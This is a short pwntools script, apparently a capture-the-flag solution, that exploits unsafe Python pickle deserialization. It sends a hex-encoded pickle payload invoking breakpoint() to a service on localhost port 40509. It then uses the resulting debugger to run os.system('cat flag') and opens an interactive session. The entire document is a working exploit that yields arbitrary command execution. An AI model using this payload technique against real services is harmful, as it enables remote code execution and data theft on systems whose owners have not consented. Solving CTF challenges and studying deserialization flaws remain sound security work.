#!/usr/bin/python3
from pwn import *

p = b'('  # MARK
p += b'i__builtin__\nbreakpoint\n'  # INST
p = binascii.hexlify(p).decode('utf-8')

conn = remote('localhost', 40509)
print(conn.recvuntil(b': '))
conn.sendline(p.encode())
conn.sendline(b'import os; os.system("cat flag")')
conn.interactive()
